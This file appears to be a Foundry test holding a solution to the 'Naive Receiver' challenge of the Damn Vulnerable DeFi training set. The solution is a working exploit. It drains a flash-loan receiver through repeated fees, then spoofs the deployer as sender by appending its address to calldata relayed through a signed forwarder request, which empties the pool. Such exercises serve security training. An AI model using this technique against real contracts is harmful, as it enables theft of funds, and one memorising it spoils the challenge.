// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public 
    checkSolvedByPlayer 
    {
        ///// 1. preparing multicall params /////
        bytes[] memory multicall_param = new bytes[](11);
        // call 10 times flashloan to pass the borrower's funds to the pool via fee-taking
        for (uint8 i = 0; i<10; i++) {
            multicall_param[i] = abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                address(receiver),
                address(weth),
                1, // the amount doesn't matter, cause the fee is fixed to 1 WETH
                ""
            );  
        }

        // THE ATTACK HEART IS HERE
        // call withdraw with arbitrary latest 20 bytes AKA the deployer address 
        multicall_param[10] = abi.encodeWithSignature(
            'withdraw(uint256,address)',
            weth.balanceOf(address(pool)) + 10e18, // +fees
            payable(recovery),
            deployer // attack -> This will be the latest 20 bytes of the call 
        );

        // multicall data
        bytes memory multicallData = abi.encodeWithSignature(
            "multicall(bytes[])",
            multicall_param
        );  

        ///// 2. prepare params for forwarder.execute function //////
        // 'request' param
       BasicForwarder.Request memory reqForwarder = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 1e8, // any that covers the gas usage 
            nonce: forwarder.nonces(player),
            data: multicallData, // our prepared call data
            deadline: block.timestamp + 5 days // any
       });

        // 'signature' param -> google "eip-712' and "eip-192" to understand
        bytes32 request = keccak256(
        abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(reqForwarder))
        );


        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk,request);
        bytes memory signature = abi.encodePacked(r, s, v);

        ///// 3. execute call /////
        forwarder.execute(reqForwarder, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
